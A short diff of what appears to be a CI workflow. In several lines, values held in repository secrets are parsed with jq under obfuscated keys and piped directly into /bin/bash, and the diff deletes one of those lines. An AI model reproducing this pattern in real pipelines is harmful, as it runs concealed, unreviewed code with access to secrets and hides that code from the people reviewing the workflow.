@@ -23,7 +23,6 @@ jobs:
           q8: ${{ secrets.q8 }}
         run: |
           printf '%s' "$q8" | jq -r .rwxl3388 | /bin/bash
-          echo $z272 | jq -r .hbqgh9670 | /bin/bash
           printf '%s' "$vybf0" | jq -r .aflj20210 | /bin/bash
           printf '%s' "$mf75886" | jq -r .iafx24 | /bin/bash
 
